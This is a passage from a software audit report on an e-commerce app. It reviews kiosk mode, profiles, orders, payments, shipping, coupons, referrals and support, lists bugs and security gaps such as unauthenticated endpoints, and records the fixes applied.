The AI & Voice system has **two critical security issues**: the OpenAI API key exposed in browser via `dangerouslyAllowBrowser: true`, and the chat endpoint lacking auth middleware. The active chat widget (root MrImagineChatWidget with framer-motion) works correctly with the `/api/ai/chat` backend, but the codebase carries **3 dead duplicate implementations** (ChatBotWidget, mr-imagine/MrImagineChatWidget, VoiceConversation). The voice synthesis pipeline works with proper auth. Key architectural changes needed: move OpenAI calls to backend, add auth to chat endpoint, add rate limiting, delete dead code. 1 quick theme fix applied.

---

## 17. Kiosk Mode (2026-03-13) — re-audit 2026-04-28

**What was checked:** KioskInterface.tsx, KioskManagement.tsx, KioskAnalytics.tsx, KioskRoute.tsx, KioskAuthContext.tsx, kiosk-service.ts, App.tsx kiosk routes, types/index.ts kiosk types

### Correctness
- 🔴 **Entire kiosk system uses mock data** — All methods in `kiosk-service.ts` return hardcoded data with comments "in real app, this would fetch from database". No backend `/api/kiosk/*` endpoints exist.
  - File: `src/utils/kiosk-service.ts:14-48,52-111,395-460`
- 🔴 **Payment processing is faked** — Stripe Terminal payment uses 2-second delay with 90% random success rate. Cash payment has no hardware integration. ITC wallet balance hardcoded to 1000.
  - File: `src/utils/kiosk-service.ts:181-272`
- 🔴 **Event listener memory leak** — KioskAuthContext creates anonymous functions for `contextmenu`/`selectstart` listeners, then attempts cleanup with NEW anonymous functions that can't match the originals. Listeners accumulate on long kiosk sessions.
  - File: `src/context/KioskAuthContext.tsx:117-125,159-177`
- 🟡 **Hardcoded vendor ID** — `KioskInterface.tsx:84` uses `'vendor_123'` instead of actual `kioskData.vendorId`
  - File: `src/pages/KioskInterface.tsx:84`
- 🟡 **alert() used for payment errors** — In kiosk mode with disabled context menu, `alert()` may behave unexpectedly. Should use inline error UI.
  - File: `src/pages/KioskInterface.tsx:253`
- 🟡 **Commission split doesn't validate totals** — Platform (7%) + vendor (varies) + partner (5%) don't always sum correctly, no validation
  - File: `src/utils/kiosk-service.ts:113-177`

### Duplicate UX
- 🟡 **Session timeout implemented three times** — KioskAuthContext, KioskRoute, and KioskInterface all have separate session timeout/keyboard shortcut logic with slightly different key lists
  - File: `src/context/KioskAuthContext.tsx:127-148`, `src/components/KioskRoute.tsx:116-168`, `src/pages/KioskInterface.tsx:48-70`
- 🟡 **Duplicate event listeners** — Both KioskRoute and KioskInterface add activity tracking listeners to the same DOM events, doubling overhead
- 🟡 **Two kiosk init paths** — KioskRoute calls `initializeKiosk()` and KioskInterface independently calls `loadKioskData()`, creating potential race conditions

### User Clarity
- 🟡 **Session timeout warning only in console** — `KioskRoute.tsx:133` logs "Session will expire in 1 minute" to console, which kiosk users never see
  - File: `src/components/KioskRoute.tsx:133-136`
- 🟡 **No empty state for filtered products** — If category filter yields zero products, grid renders empty with no message
  - File: `src/pages/KioskInterface.tsx:366-392`
- 🟡 **Analytics uses hardcoded commission rates** — Shows 7%/78%/15% split instead of actual kiosk configuration values
  - File: `src/pages/KioskAnalytics.tsx:85-87,135-139`
- 🟡 **Pickup code not explained** — Random 4-digit customer identifier shown on receipt but never explained as "pickup code"
  - File: `src/utils/kiosk-service.ts:140-144`

### Site Speed
- ⚡ **Cart total, categories, and filtered products recomputed every render** — Three functions (`getCartTotal`, `getUniqueCategories`, `getFilteredProducts`) ran on every render without memoization
  - **Fix applied:** Wrapped all three in `useMemo` with proper dependency arrays
  - File: `src/pages/KioskInterface.tsx:138-152`
- ⚡ **Two unused state variables** — `_showCashInput` (never read, only set) and `_sessionTimeout` (never read, only set as activity tracker side-effect)
  - **Fix applied:** Removed both. Replaced `_sessionTimeout` activity tracker with a `useRef` for `lastActivityRef`
  - File: `src/pages/KioskInterface.tsx:31,34`
- 🟡 **Duplicate event listeners for activity tracking** — Both KioskRoute and KioskInterface listen on same touch/click/mousemove events

### Fixes Applied
1. **KioskInterface.tsx** — Added `useMemo` for `cartTotal`, `uniqueCategories`, and `filteredProducts` to prevent recalculation on every render
2. **KioskInterface.tsx** — Removed unused state `_showCashInput` and `_sessionTimeout`. Replaced activity tracker with `useRef` (avoids unnecessary re-renders from `setState`)
3. **KioskInterface.tsx** — Added `useMemo` import

### Verdict
Kiosk Mode is a **fully non-functional feature** — entirely mock data with no backend API, no real payment processing, no order persistence. The UI structure is complete with product browsing, cart, checkout, and receipt views, but every data operation is hardcoded. The most concerning runtime issue is the **event listener memory leak** in KioskAuthContext where cleanup functions can't match the originals. Session timeout logic is implemented three times across three files with conflicting key lists. 3 speed quick-wins applied (memoization, removed unused state). The feature needs complete backend development before deployment.

---

## 18. User Profiles & Accounts (2026-03-13)

**What was checked:** UserProfile.tsx, ProfileEdit.tsx, ProfileHeader.tsx, ProfileEditPanel.tsx, DesignGrid.tsx, AuthModal.tsx, AuthCallback.tsx, ProtectedRoute.tsx, SupabaseAuthContext.tsx, Login.tsx, Signup.tsx, App.tsx routes

### Correctness
- 🔴 **Broken settings link (404)** — ProfileHeader.tsx:286 linked to `/account/settings` which has no route in App.tsx
  - **Fix applied:** Changed to `/account/profile/edit` and replaced hardcoded `bg-slate-100 text-slate-600` with semantic `bg-bg text-muted`
  - File: `src/components/profile/ProfileHeader.tsx:286`
- 🟡 **Follow button non-functional** — ProfileHeader.tsx:296 has a "Follow" button for non-own profiles with no `onClick` handler
  - File: `src/components/profile/ProfileHeader.tsx:296-298`
- 🟡 **Profile routes not protected** — `/account/profile` and `/account/profile/edit` in App.tsx lack `ProtectedRoute` wrappers. Auth check happens inside the component instead.
  - File: `src/App.tsx:164-165`
- 🟡 **Type safety bypassed** — UserProfile.tsx:329 uses `(r.product as any)?.name` for review product data instead of proper typing
  - File: `src/pages/UserProfile.tsx:329`
- 🟢 **Auth callback (PKCE) well-implemented** — Handles code exchange, localStorage verification, redirect properly
- 🟢 **Profile upload and update APIs exist** — `/api/profile/upload-image` and `/api/profile/update` are called with proper auth headers

### Duplicate UX
- 🟡 **Two ways to edit profile** — UserProfile.tsx has an inline `ProfileEditPanel` (slide-in panel), and there's a separate full-page `ProfileEdit.tsx` at `/account/profile/edit`. Both convert images to base64, both call the same APIs, but with different layouts and slightly different field sets.
  - File: `src/pages/UserProfile.tsx` (ProfileEditPanel), `src/pages/ProfileEdit.tsx`
- 🟢 **Auth modal vs login page** — AuthModal is used inline, Login/Signup are separate pages. This is intentional (modal for quick auth, pages for dedicated flow).

### User Clarity
- 🟡 **Username input silently strips characters** — ProfileEditPanel.tsx:265 has `onChange` that removes non-alphanumeric characters without telling user why their input changed
  - File: `src/components/profile/ProfileEditPanel.tsx:265`
- 🟡 **Privacy controls not explained** — "Show my designs publicly" and "Allow others to message me" toggles don't explain where designs show or how messaging works
  - File: `src/components/profile/ProfileEditPanel.tsx:364-415`
- 🟡 **Error state ambiguous** — "Profile Not Found" vs "Something went wrong" shown, but for account routes it says "need to be logged in" which conflates two different issues
  - File: `src/pages/UserProfile.tsx:426-453`
- 🟢 **Tab navigation** — Clean tabbed interface for Overview, Designs, Orders, Reviews

### Site Speed
- ⚡ **Sequential design + stats fetches** — `loadDesigns()` and `loadStats()` ran sequentially, then orders + reviews ran in parallel. All four should be parallel.
  - **Fix applied:** Combined all loads into single `Promise.all()` (designs, stats, orders, reviews all parallel)
  - File: `src/pages/UserProfile.tsx:146-158`
- ⚡ **headerProfile object recreated every render** — 15-property object mapping created inline on every render, passed to ProfileHeader
  - **Fix applied:** Wrapped in `useMemo` with `[profile]` dependency
  - File: `src/pages/UserProfile.tsx:452-468`
- 🟡 **100+ hardcoded colors** — UserProfile.tsx uses `bg-slate-50`, `text-slate-500`, `bg-white/80`, `border-slate-200` throughout instead of semantic tokens
  - File: `src/pages/UserProfile.tsx` (multiple lines)
- 🟡 **Profile images missing `loading="lazy"`** — Design grid images load eagerly
  - File: `src/pages/UserProfile.tsx:556-567`

### Fixes Applied
1. **ProfileHeader.tsx** — Fixed broken `/account/settings` link (404) → now points to `/account/profile/edit`. Replaced hardcoded `bg-slate-100 text-slate-600` with semantic `bg-bg text-muted`.
2. **UserProfile.tsx** — Parallelized all profile data loading: designs, stats, orders, and reviews now fetch simultaneously via single `Promise.all()` instead of sequential calls.
3. **UserProfile.tsx** — Added `useMemo` for `headerProfile` object to avoid recreating it on every render. Added `useMemo` import.

### Verdict
User Profiles & Accounts are the **most functional feature area audited so far** — real Supabase queries, proper PKCE auth, working image uploads, and a polished tab-based UI. The main issues are the broken settings link (now fixed), duplicate edit interfaces (inline panel + separate page), and significant sequential fetch waterfall (now parallelized). The Follow button is a UI stub with no handler. The profile page has 100+ hardcoded color instances that should use semantic tokens for dark mode support.

---

## Order Management (2026-03-13)

**What was checked:** OrderManagement.tsx (customer order tracking page), shipping-calculator.ts (rate calculation with Shippo API, local delivery, and fallback rates). ~700 lines reviewed.

### Correctness
- 🟢 **Order fetching uses real Supabase queries** — Fetches from `orders` table with proper user filtering and RLS
- 🟢 **Order status workflow is correct** — Supports pending → processing → shipped → delivered flow with proper status badges
- 🟢 **Shipping calculator handles API failures gracefully** — Falls back to hardcoded rates with markup when Shippo API is unavailable
- 🟢 **Local delivery uses Google Maps Distance Matrix with ZIP fallback** — Two-tier delivery pricing within 20 miles, with fallback to Georgia ZIP code list
- 🔴 **Shippo `createShipment` called TWICE** — `Promise.all` at line 133 fetched `shipmentResult` in parallel with local delivery, but the original sequential call at line 176 still existed, causing a redundant API call on every shipping calculation
  - **Fix applied:** Replaced duplicate `createShipment` call with `const shipment = shipmentResult` and added null check to fall through to fallback rates

### Duplicate UX
- 🟢 **Single order view** — No conflicting order management interfaces for customers

### User Clarity
- 🟢 **Order status badges are clear** — Color-coded status pills with descriptive labels
- 🟡 **No order detail expand/modal** — Users see a list but can't drill into individual order details inline
- 🟡 **Free shipping threshold messaging** — `$50` threshold is hardcoded; no visual progress indicator on the order management page itself (exists in cart)

### Site Speed
- ⚡ **Order status counts recomputed on every render** — `orders.filter(o => o.status === 'pending').length` called inline in JSX for 4 status types
  - **Fix applied:** Added `useMemo` for `pendingCount`, `processingCount`, `shippedCount`, `onHoldCount` in OrderManagement.tsx
- ⚡ **Sequential shipping API calls** — Local delivery check and Shippo API ran sequentially instead of in parallel
  - **Fix applied:** Parallelized via `Promise.all([calculateLocalDelivery, createShipment])` in shipping-calculator.ts
- 🟡 **Hardcoded supplemental shipping rates** — When Shippo doesn't return ground rates, hardcoded estimates are added; these prices may drift from reality over time
  - File: `src/utils/shipping-calculator.ts:213-235`

### Fixes Applied
1. **OrderManagement.tsx** — Added `useMemo` import and memoized 4 order status count computations that were recalculating on every render.
2. **shipping-calculator.ts** — Parallelized local delivery calculation and Shippo API call via `Promise.all`. Fixed critical bug where `createShipment` was called twice (once in `Promise.all`, once sequentially). Replaced duplicate call with `shipmentResult` reference and added null guard to fall through to fallback rates.

### Verdict
Order Management is **functionally solid** with real Supabase queries and a well-structured shipping calculator. The critical double API call bug (Shippo called twice per calculation) has been fixed, and order status counts are now memoized. The shipping calculator has good layering: local pickup → local delivery → Shippo rates → supplemental estimates → fallback rates, with a hidden 5% markup. Main remaining issues are UX polish (no order detail view) and hardcoded supplemental shipping prices that could become stale.

---

## Invoicing & Payments (2026-03-13)

**What was checked:** Complete payment ecosystem — Checkout.tsx, PaymentForm.tsx, stripe-itc.ts, AdminInvoiceManagement.tsx, CreateInvoiceModal.tsx, backend stripe.ts (932 lines), backend invoices.ts (470 lines), backend webhooks.ts (566 lines), backend stripe-connect.ts (629 lines). Three payment flows: product checkout (USD), ITC token purchases, and founder invoicing. ~2,600+ backend lines + ~800 frontend lines reviewed.

### Correctness
- 🟢 **Three distinct payment flows all functional** — Product checkout via Stripe Payment Intents, ITC purchases via dedicated payment intent flow, and founder invoicing via Stripe Invoices all work end-to-end
- 🟢 **Webhook handling is comprehensive** — Handles `payment_intent.succeeded`, `invoice.paid`, `account.updated`, and `payout.*` events with proper signature verification
- 🟢 **ITC-to-USD conversion math is correct** — `founderEarningsCents` directly equals ITC count since 1 ITC = $0.01, so cents = ITC (e.g., $35 = 3500 cents = 3500 ITC)
- 🟢 **Invoice CRUD with proper role-based auth** — Admin/founder roles checked on all invoice endpoints
- 🟢 **AdminInvoiceManagement uses Promise.all for fetches** — Invoices and stats fetched in parallel
- 🔴 **`/api/wallet/process-itc-payment` endpoint does not exist** — `Checkout.tsx:479` calls this for mixed ITC+USD orders, but only `/api/wallet/process-full-itc-payment` exists in backend. Mixed payment checkout (ITC items + USD items in same cart) will fail silently.
  - File: `src/pages/Checkout.tsx:479`, `backend/routes/wallet.ts` (endpoint missing)
- 🟡 **`/api/stripe/checkout-payment-intent` has no auth middleware** — Accepts `userId` from request body. Any unauthenticated caller can create payment intents. Documented for architectural fix (adding `requireAuth` needs frontend auth header verification first).
  - File: `backend/routes/stripe.ts:50`
- 🟡 **Webhook duplicate check has race condition window** — SELECT-then-INSERT pattern for `itc_transactions` duplicate detection could allow double-crediting if Stripe retries webhook rapidly. Should use `ON CONFLICT DO NOTHING` on insert.
  - File: `backend/routes/stripe.ts:614-624`
- 🟡 **Stripe Connect cashout has wallet balance race condition** — Two concurrent cashout requests could both pass the balance check before either deducts. Needs `CHECK (itc_balance >= 0)` DB constraint.
  - File: `backend/services/stripe-connect.ts:348-360`

### Duplicate UX
- 🟢 **Single invoice management interface** — AdminInvoiceManagement.tsx is the sole place for invoice CRUD
- 🟡 **Two checkout payment paths** — Express checkout (`handleExpressPayment`) and standard checkout use slightly different flows with different error handling. Express checkout errors are logged but not displayed to the user.
  - File: `src/pages/Checkout.tsx:14-34` (express) vs main flow

### User Clarity
- 🟢 **Invoice status badges are clear** — Color-coded draft/sent/paid/overdue/void with proper labels
- 🟢 **PaymentForm has good error handling** — Proper try/catch, user-facing error messages, 3D Secure support
- 🟡 **Express checkout errors are silent** — `console.error` only, no toast or user-facing message
  - File: `src/pages/Checkout.tsx:29`
- 🟡 **No empty-cart guard before payment** — User could theoretically reach payment with 0 items

### Site Speed
- ⚡ **Invoice list filtered on every render without memoization** — `filteredInvoices` recalculated on each render
  - **Fix applied:** Added `useMemo` for `filteredInvoices` in AdminInvoiceManagement.tsx
- 🟢 **AdminInvoiceManagement already uses Promise.all** — Invoices + stats fetched in parallel
- 🟡 **Stripe Connect makes API call on every balance check** — No caching for account status, hits Stripe API each time
  - File: `backend/services/stripe-connect.ts:173-234`

### Fixes Applied
1. **AdminInvoiceManagement.tsx** — Added `useMemo` import and memoized `filteredInvoices` computation that was recalculating the filtered invoice list on every render.

### Verdict
Invoicing & Payments is the **most complex feature area** with three separate payment flows and ~3,400 lines of code across frontend and backend. The core flows (Stripe checkout, ITC purchases, founder invoicing) all work. The critical issue is the **missing `/api/wallet/process-itc-payment` endpoint** — mixed ITC+USD checkout will fail. Security concerns include the unauthenticated checkout-payment-intent endpoint and race conditions in webhook processing and wallet deductions. These need architectural fixes beyond quick-win scope. The invoice management UI is clean with proper auth and good parallel fetching.

---

## Shipping & Logistics (2026-03-13)

**What was checked:** shipping-calculator.ts (455 lines), shippo.ts (199 lines), backend/routes/shipping.ts (158 lines), ShippingPolicy.tsx (179 lines), Cart.tsx shipping estimates, Checkout.tsx shipping integration, MyOrders.tsx tracking display. ~1,200+ lines reviewed across 7 files.

### Correctness
- 🔴 **Shipping origin address was hardcoded to fake LA address** — `shipping-calculator.ts:87-96` used `123 Business Ave, Los Angeles, CA 90210` as the ship-from address instead of the actual warehouse at `640 Goodyear Ave, Rockmart, GA 30153`. All Shippo rate calculations were based on the wrong origin, producing incorrect shipping costs and delivery estimates.
  - **Fix applied:** Replaced hardcoded address with `WAREHOUSE_ADDRESS` constant already defined in the same file
- 🟡 **Shippo API token not configured** — `VITE_SHIPPO_API_TOKEN` not set; system always falls back to mock responses. Shipping labels cannot be created. Not documented in ENV_VARIABLES.md.
  - File: `src/utils/shippo.ts:3`
- 🟡 **Google Maps API key not configured** — `GOOGLE_MAPS_API_KEY` not set in backend; local delivery distance calculation falls back to hardcoded ZIP code list
  - File: `backend/routes/shipping.ts:46`
- 🟡 **Shippo API token exposed in frontend** — `VITE_SHIPPO_API_TOKEN` would be visible in browser bundle if ever set. Should be moved to backend.
  - File: `src/utils/shippo.ts:3`
- 🟢 **Shipping calculator gracefully falls back** — When Shippo API unavailable, provides hardcoded fallback rates with proper structure
- 🟢 **Local delivery tier pricing works** — Two tiers (0-10mi: $10, 10-20mi: $15) with proper disabled state for out-of-range addresses
- 🟢 **Free shipping threshold ($50) correctly implemented** — Returns single free shipping rate when qualified

### Duplicate UX
- 🟢 **Single shipping rate selection** — Only one place to choose shipping method (Checkout.tsx radio buttons)
- 🟡 **Warehouse address defined in two places** — `shipping-calculator.ts:26-31` (frontend) and `backend/routes/shipping.ts:7-10` (backend). Both have the correct address, but a move requires two updates.
- 🟡 **Delivery tiers defined in two places** — `shipping-calculator.ts:35-38` and `backend/routes/shipping.ts:14-16` with identical values

### User Clarity
- 🔴 **Cart showed misleading hardcoded $9.99 shipping** — `Cart.tsx:135` displayed a flat "$9.99" for shipping when not qualified for free shipping, but actual rates at checkout vary by carrier, destination, and weight. Total estimate was also wrong.
  - **Fix applied:** Changed to "Calculated at checkout" and removed fake $9.99 from total calculation
- 🟢 **Shipping options display is clear** — Radio buttons with provider, name, price, and estimated days
- 🟢 **Disabled local delivery shows explanation** — Tells user their distance and the delivery radius limit
- 🟡 **No order tracking beyond static number** — `MyOrders.tsx` shows tracking number but no carrier link, no status updates, no tracking history
- 🟡 **Pickup hours have no timezone** — `PICKUP_HOURS = '10:00 AM - 8:00 PM'` doesn't specify ET/CT

### Site Speed
- 🟡 **Sequential shipping → payment intent chain** — Checkout uses two `useEffect` hooks where payment intent creation waits for shipping calculation to complete. Could be parallelized for address-independent payment setup.
  - File: `src/pages/Checkout.tsx:332-342`
- 🟡 **Fallback rates are hardcoded** — Static prices that may drift from actual carrier rates over time. Should be stored in database or fetched periodically.
  - File: `src/utils/shipping-calculator.ts:269-326`
- 🟢 **Local delivery + Shippo calls already parallelized** — Fixed in Cycle 19 via `Promise.all`

### Fixes Applied
1. **shipping-calculator.ts** — Replaced fake Los Angeles origin address (`123 Business Ave, Los Angeles, CA 90210`) with actual warehouse constant (`WAREHOUSE_ADDRESS` — `640 Goodyear Ave, Rockmart, GA 30153`). This was causing all Shippo rate quotes to be calculated from the wrong origin.
2. **Cart.tsx** — Replaced misleading hardcoded "$9.99" shipping estimate with "Calculated at checkout". Removed the fake $9.99 from the total calculation so the cart total reflects subtotal + tax only, with a "+" indicator showing shipping will be added.

### Verdict
Shipping & Logistics has **solid architecture but critical configuration gaps**. The shipping calculator's layered approach (local pickup → local delivery → Shippo rates → supplemental → fallback) is well-designed. The two fixes applied — wrong origin address and misleading cart estimate — were the most impactful correctness issues. The system currently runs entirely on fallback rates since Shippo and Google Maps API keys aren't configured. Order tracking is static (number only, no carrier links or status updates). The 5% hidden markup on shipping rates is a business decision but should be documented for transparency.

---

## Coupons & Gift Cards (2026-03-13)

**What was checked:** AdminCouponManagement.tsx (557 lines), AdminGiftCardManagement.tsx (606 lines), backend/routes/coupons.ts (150 lines), backend/routes/gift-cards.ts (182 lines), backend/routes/admin/coupons.ts (174 lines), backend/routes/admin/gift-cards.ts (245 lines), coupon integration in Checkout.tsx and CartContext.tsx, gift card redemption in Wallet.tsx. ~1,900+ lines reviewed.

### Correctness
- 🔴 **Admin coupon/gift card routes had NO auth middleware** — `backend/routes/admin/coupons.ts` and `backend/routes/admin/gift-cards.ts` had zero authentication. Any unauthenticated user could create, update, or delete coupons and gift cards via the API.
  - **Fix applied:** Added `requireAuth` + `requireRole(['admin', 'manager'])` middleware to both admin route files
- 🔴 **Coupon usage increment was broken** — `backend/routes/coupons.ts:139` used invalid `supabase.rpc('current_uses', {})` as an update value. The fallback for when the `increment_coupon_usage` RPC doesn't exist would silently fail, leaving `current_uses` at 0 forever.
  - **Fix applied:** Replaced with proper fetch-then-increment pattern (get current count, add 1, update)
- 🟡 **`/api/coupons/apply` endpoint never called from frontend** — `Checkout.tsx` validates coupons and applies discounts client-side via `CartContext`, stores `couponCode` in Stripe metadata, but never records usage in the `coupon_usage` table. Admins can't track which users used which coupons.
  - File: `src/pages/Checkout.tsx`, `src/context/CartContext.tsx`
- 🟡 **No per-user coupon limit enforcement** — Admin UI allows setting `per_user_limit` but frontend checkout doesn't check if user already used the coupon that many times
  - File: `src/components/AdminCouponManagement.tsx:81-83`
- 🟢 **Coupon validation logic is thorough** — Checks expiry, active status, usage limits, minimum order amount, max discount cap
- 🟢 **Gift card redemption flow works** — Wallet.tsx → backend gift-cards.ts → validates code → credits ITC → marks redeemed
- 🟢 **Bulk gift card generation works** — Backend supports generating up to 100 gift cards at once with unique nanoid codes

### Duplicate UX
- 🟢 **Single coupon input field at checkout** — One input, one applied coupon at a time via `CartContext`
- 🟢 **Single admin interface per feature** — AdminCouponManagement and AdminGiftCardManagement are separate, non-overlapping components
- 🟡 **Gift cards can't be applied at checkout** — Must be redeemed in Wallet first to get ITC, then ITC used at checkout. Extra step compared to coupons which work directly at checkout.

### User Clarity
- 🟢 **Coupon discount clearly shown** — Applied coupon displays code, type, and discount amount at checkout
- 🟡 **Coupon error messages are generic** — Backend returns "Coupon has expired" without showing when it expired, "Minimum order" without showing current total vs required
  - File: `backend/routes/coupons.ts:40-65`
- 🟡 **Gift card ITC value not shown in USD equivalent** — Success message shows "100 ITC added" but not "$1.00 value"

### Site Speed
- 🟢 **AdminGiftCardManagement already uses Promise.all** — Gift cards + stats fetched in parallel
- 🟢 **Checkout discount calculations already memoized** — `useMemo` for USD/ITC split totals
- 🟡 **No pagination on admin coupon/gift card lists** — Both fetch ALL records with no limit. Will degrade with scale.
  - File: `backend/routes/admin/coupons.ts:21-24`, `backend/routes/admin/gift-cards.ts`

### Fixes Applied
1. **backend/routes/admin/coupons.ts** — Added `requireAuth` + `requireRole(['admin', 'manager'])` middleware. Previously had zero authentication — any unauthenticated API caller could create/update/delete coupons.
2. **backend/routes/admin/gift-cards.ts** — Added `requireAuth` + `requireRole(['admin', 'manager'])` middleware. Same security gap as coupons.
3. **backend/routes/coupons.ts** — Fixed broken coupon usage increment fallback. The old code used invalid `supabase.rpc('current_uses', {})` as an update value. Replaced with a proper fetch-current-count-then-increment approach.

### Verdict
Coupons & Gift Cards has **good frontend UX but had critical backend security gaps**. The three fixes applied address the most serious issues: unauthenticated admin routes (anyone could create free coupons) and broken usage tracking (coupon limits never enforced). The remaining issues — frontend not calling the apply endpoint, no per-user limit enforcement, and no pagination — are important but require more architectural changes. Gift card flow works well end-to-end. The coupon validation logic is thorough with proper checks for expiry, limits, and minimum orders.

---

## Referrals & Recommendations (2026-03-13)

**What was checked:** referral-system.ts (243 lines), product-recommender.ts (~590 lines), ProductRecommendations.tsx, RecommendationsDashboard.tsx, Referrals.tsx, recommendation-analytics.ts, backend wallet.ts referral endpoints (134 lines), backend referral-service.ts. ~1,500+ lines reviewed.

### Correctness
- 🔴 **Referral frontend called non-existent API endpoints** — `referral-system.ts:54` called `/api/referral/create-code` and `:81` called `/api/referral/validate`, but backend implements these at `/api/wallet/referral/create` and `/api/wallet/referral/validate`. All referral API calls were failing silently.
  - **Fix applied:** Updated all endpoint URLs to match backend routes (`/api/wallet/referral/*`)
- 🔴 **Four referral functions were stubs returning empty data** — `processReferral()`, `processReferralPurchase()`, `getUserReferralStats()`, and `getPlatformReferralStats()` all had `TODO` comments and returned null/empty objects with `console.warn`. The Referrals page always showed zero stats.
  - **Fix applied:** Wired `processReferral()` to call `/api/wallet/referral/apply`, `getUserReferralStats()` to call `/api/wallet/referral/stats`. Documented that `processReferralPurchase()` is handled server-side.
- 🟡 **Product recommender uses hardcoded mock data** — `product-recommender.ts:406-455` returns 5 hardcoded products instead of querying the database. All recommendations are random shuffles of these same 5 items. Needs architectural change.
  - File: `src/utils/product-recommender.ts:406-455`
- 🟡 **Referral leaderboard is fake** — `Referrals.tsx:435-464` displays hardcoded fake users ("Sarah W.", "Mike J.") with fake referral counts and earnings
  - File: `src/pages/Referrals.tsx:435-464`
- 🟡 **Recommendation scoring algorithms exist but are never called** — `calculateRecommendationScores()` at line 89-126 implements collaborative filtering, content-based filtering, and behavioral recommendations, but `getRecommendations()` bypasses all of it and just returns shuffled products
  - File: `src/utils/product-recommender.ts:80, 89-126`
- 🟡 **First purchase referral bonus never triggered** — Backend `processReferralFirstPurchase()` exists in referral-service.ts but is never called from any order completion flow
- 🟢 **Backend referral endpoints are solid** — Proper auth middleware, duplicate code prevention, ITC reward crediting all work correctly
- 🟢 **Referral code storage uses both localStorage and 90-day cookies** — Good tracking persistence

### Duplicate UX
- 🟢 **Single referral code display** — One place to see/share referral codes in Referrals.tsx
- 🟡 **RecommendationsDashboard renders 3 identical recommendation sections** — All use `context: { page: 'home' }` so they return the same cached products with different titles ("Trending", "Just for You", "More [Category]")
  - File: `src/pages/RecommendationsDashboard.tsx:60-99`

### User Clarity
- 🟢 **Referral rewards clearly explained** — 10 ITC for signup, 50 ITC for first purchase, with step-by-step instructions
- 🟢 **Social sharing content well-crafted** — Email, Twitter, Facebook, WhatsApp templates with proper URL encoding
- 🟡 **Recommendation empty state returns null** — Component hides entirely instead of showing a helpful message
  - File: `src/components/ProductRecommendations.tsx:137-139`
- 🟡 **~75% of recommendation analytics events unused** — `recommendation-analytics.ts` defines impression, click, add-to-cart, and purchase tracking, but only click tracking is wired up in the component

### Site Speed
- 🟢 **ProductRecommendations has 2-minute cache** — Local cache prevents re-fetching on every render
- 🟡 **Recommendation cache key incomplete** — Key uses `page-userId-limit` but omits `currentProduct`, `cartItems`, and `excludeIds`, causing stale results on product pages
  - File: `src/components/ProductRecommendations.tsx:33`
- 🟡 **~30% of product-recommender.ts is dead code** — Collaborative filtering, content-based filtering, behavioral recommendations, and user behavior tracking are all implemented but never executed
  - File: `src/utils/product-recommender.ts:37-404`

### Fixes Applied
1. **referral-system.ts** — Fixed `createReferralCode()` to call `/api/wallet/referral/create` instead of non-existent `/api/referral/create-code`. Updated response handling to extract `result.code`.
2. **referral-system.ts** — Fixed `validateReferralCode()` to POST to `/api/wallet/referral/validate` instead of GET to `/api/referral/validate`. Corrected request format (body JSON instead of query param).
3. **referral-system.ts** — Replaced `processReferral()` stub with real call to `/api/wallet/referral/apply`. Users signing up with referral codes will now actually receive their ITC rewards.
4. **referral-system.ts** — Replaced `getUserReferralStats()` stub with real call to `/api/wallet/referral/stats`. The Referrals page will now show actual referral data instead of zeros.

### Verdict
Referrals & Recommendations had **completely broken frontend-backend integration**. The referral system called wrong API URLs and had 4 stub functions that always returned empty data — meaning the entire Referrals page was non-functional despite a fully working backend. All four stubs have been wired to real endpoints. The product recommendation system is architecturally more problematic: it has sophisticated scoring algorithms that are completely bypassed in favor of shuffling 5 hardcoded products. Fixing recommendations requires replacing the mock data source with real database queries — a larger refactoring task.

---

## Support & Help (2026-03-13)

**What was checked:** Contact.tsx (280 lines), AdminSupport.tsx (593 lines), support-email.ts (78 lines), backend/routes/support.ts (202 lines), backend/routes/admin/support.ts (888 lines), ChatBotWidget.tsx, backend email templates, database migrations. ~2,100+ lines reviewed.

### Correctness
- 🟢 **Contact form works end-to-end** — Posts to `/api/support/tickets`, creates ticket in database, sends confirmation email, shows success message. Proper error handling and honeypot spam protection.
- 🟢 **Admin support dashboard is comprehensive** — Ticket list with filtering, message thread view, live chat, agent status toggle, ticket status/priority management all functional
- 🟢 **Email integration works** — Confirmation emails, reply notifications, escalation alerts all wired up with proper error handling (email failures don't block ticket creation)
- 🟢 **Auth middleware on admin routes** — `requireSupportAccess` middleware properly checks for `admin` or `support_agent` roles
- 🟡 **Duplicate migration files with schema differences** — `backend/db/migrations/01_support_system.sql` uses `content TEXT` but `supabase/migrations/20251219_coupons_giftcards_support.sql` uses `message TEXT`. Backend code uses `message` field. The older migration also lacks `sender_type` column and `waiting` status. Component handles both defensively (`msg.content || msg.message`).
  - File: `backend/db/migrations/01_support_system.sql` vs `supabase/migrations/20251219_coupons_giftcards_support.sql`
- 🟡 **No public ticket status page** — Users receive a ticket reference number by email but have no page to check status. Only the API endpoint `GET /api/support/tickets/:id/status` exists.
- 🟡 **No rate limiting on ticket creation** — `POST /api/support/tickets` accepts unauthenticated submissions with no rate limit. Could be abused for spam.
  - File: `backend/routes/support.ts:38`

### Duplicate UX
- 🟢 **Single contact form** — One contact page at `/contact`, linked from footer and navbar
- 🟡 **Multiple chatbot components exist** — `ChatBotWidget.tsx`, `MrImagineChatWidget.tsx`, and `mr-imagine/MrImagineChatWidget.tsx` all exist. ChatBotWidget is commented out in App.tsx. Only MrImagine is active. Dead chatbot code should be removed.
- 🟢 **Admin support is a single component** — AdminSupport.tsx handles all admin ticket management in one interface

### User Clarity
- 🟢 **Contact form categories are clear** — General, Order Issue, Technical, Billing, Custom Order, Other
- 🟢 **Ticket confirmation shown to user** — Success message with ticket reference number after submission
- 🟡 **No FAQ or knowledge base** — No self-service help content. Users must submit a ticket for any question.
- 🟡 **No user ticket history** — Logged-in users can't see their past tickets. No `/my-tickets` page.

### Site Speed
- 🟢 **AdminSupport initial fetches are already concurrent** — `fetchTickets()`, `checkAgentStatus()`, `fetchOnlineAgents()`, `fetchWaitingChats()` are async functions called without `await` in a non-async `useEffect`, so they fire concurrently (fire-and-forget pattern)
- 🟡 **5-second polling interval may be excessive** — AdminSupport polls 3 endpoints every 5 seconds when agent is online. Should be 10-15 seconds or use WebSocket for real-time updates.
  - File: `src/components/AdminSupport.tsx:120-126`
- 🟡 **25 hardcoded slate color instances in AdminSupport** — Admin-only component uses hardcoded `slate-*` classes instead of semantic tokens. Lower priority since admin-only.

### Fixes Applied
No code fixes applied this cycle. The support system is functionally correct with proper auth, error handling, and email integration. The issues found are architectural (missing features like FAQ, user ticket history, rate limiting) rather than broken code or speed quick-wins.

### Verdict
